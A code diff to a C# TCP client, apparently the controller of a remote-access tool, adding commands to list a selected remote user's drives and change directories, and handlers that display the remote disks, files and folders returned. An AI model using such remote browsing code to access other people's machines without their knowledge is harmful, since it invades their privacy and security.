@@ -27,9 +27,7 @@ namespace YTAH_COMMUNITY
                 client.Connect(ip, port);
                 Thread thread = new Thread(o => ReceiveData((TcpClient)o));
                 thread.IsBackground = true;
-                thread.Start(client);
-                
-              
+                thread.Start(client);              
                     Form1.current = Form1.State.CONNECTE;
                 
 
@@ -49,6 +47,7 @@ namespace YTAH_COMMUNITY
             byte[] b = Encoding.UTF8.GetBytes("SelectUser|" + Perso.Me.username + "|" + userpost);
             ns.Write(b, 0, b.Length);
         }
+        
         public static void SendMessage(string msg)
         {
             try
@@ -66,8 +65,16 @@ namespace YTAH_COMMUNITY
         {
             commandStart = "SC;" + Perso.Me.username + ";";
         }
-
-
+        public static void GetDrives()
+        {
+            byte[] b = Encoding.UTF8.GetBytes("GetDrives|" + Perso.Me.username + "|" + Perso.Me.selected_user.username);
+            ns.Write(b, 0, b.Length);
+        }
+        public static void ChangePath(string newPath)
+        {
+            byte[] b = Encoding.UTF8.GetBytes(commandStart + "mt|" + Perso.Me.username + "|" + newPath);
+            ns.Write(b, 0, b.Length);
+        }
 
         public static void ListProcess()
         {
@@ -109,7 +116,7 @@ namespace YTAH_COMMUNITY
                 while ((byte_count = ns.Read(receivedBytes, 0, receivedBytes.Length)) > 0)
                 {
                     string d = Encoding.UTF8.GetString(receivedBytes, 0, byte_count);
-                    
+                   // MessageDisplayer.Log(d);
                     string[] splitter = d.Split('|');
                     if (d.Contains("authsuccess"))
                     {
@@ -156,6 +163,31 @@ namespace YTAH_COMMUNITY
                                 break;
                         }
 
+                    }
+                    if (d.Contains("NewDisk"))
+                    {
+                        string reqID = splitter[0];
+                        string dirName = splitter[1];
+                        DiskDirectory dd = new DiskDirectory(dirName);
+                        DiskDirectory.diskDirectories.Add(dd);
+                       
+                    }
+                    if (d.Contains("NewFile"))
+                    {
+                        string reqID = splitter[0];
+                        string dirName = splitter[1];
+                        CustomThing dd = new CustomThing(dirName);
+                        CustomThing.customThings.Add(dd);
+                        //MessageDisplayer.Log("New Created file " + CustomThing.customThings.Count.ToString());
+
+                    }
+                    if (d.Contains("NewFolder"))
+                    {
+                        string reqID = splitter[0];
+                        string dirName = splitter[1];
+                        CustomThing dd = new CustomThing(dirName);
+                        CustomThing.customThings.Add(dd);
+                        //MessageDisplayer.Log("New Created folder " + CustomThing.customThings.Count.ToString());
                     }
                     if (d.Contains("empty"))
                     {
